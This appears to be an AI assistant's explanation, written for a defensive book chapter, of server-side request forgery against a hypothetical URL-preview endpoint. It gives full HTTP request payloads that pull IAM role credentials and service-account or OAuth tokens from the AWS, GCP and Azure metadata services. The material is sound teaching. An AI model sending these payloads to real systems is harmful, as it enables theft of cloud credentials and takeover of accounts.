To illustrate this for your defensive chapter, let's imagine a hypothetical web application with a "URL Preview" feature. This feature allows users to input a URL, and the server fetches the content to display a preview card.

If this application is vulnerable to SSRF, an attacker would manipulate the url parameter to point to the cloud provider's internal metadata endpoint instead of an external website.

Here is a concrete example of what that HTTP request would look like targeting an AWS EC2 instance.

The Malicious HTTP Request

In this scenario, the vulnerable application is hosted at app.example.com.

http
GET /api/fetch-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: app.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Breakdown of the Payload
The Vulnerable Endpoint: The request targets /api/fetch-preview. This is the application logic that performs the URL fetch.
The SSRF Payload: The url parameter is set to http://169.254.169.254/latest/meta-data/iam/security-credentials/.
169.254.169.254: This is the link-local address used by AWS to host the Instance Metadata Service (IMDS). Because this request originates from the server itself, the server can reach this address, even though it is blocked by external firewalls.
/latest/meta-data/iam/security-credentials/: This specific path lists the IAM roles attached to the instance.
The Impact (The Response)

If the server blindly fetches the URL and returns the content to the user (or if the attacker can infer the content through error messages or timing attacks), the application would act as a proxy. The response body would effectively leak the name of the IAM role.

Example Response Body:

text
admin-role

An attacker would then take this role name and craft a second request to retrieve the temporary security credentials (Access Key ID, Secret Access Key, and Session Token) for that role:

http
GET /api/fetch-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1
Host: app.example.com
Variations for Other Cloud Providers

For your chapter, it is helpful to show how the payload changes based on the hosting environment:

Google Cloud (GCP)
GCP requires a specific header (Metadata-Flavor: Google) to prevent trivial SSRF attacks. However, if the vulnerable application is a simple HTTP client (like curl or requests), it often forwards headers or allows the attacker to specify them.

http
GET /api/fetch-preview?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: app.example.com
Metadata-Flavor: Google

Microsoft Azure
Azure uses the Metadata: true header.

http
GET /api/fetch-preview?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ HTTP/1.1
Host: app.example.com
Metadata: true
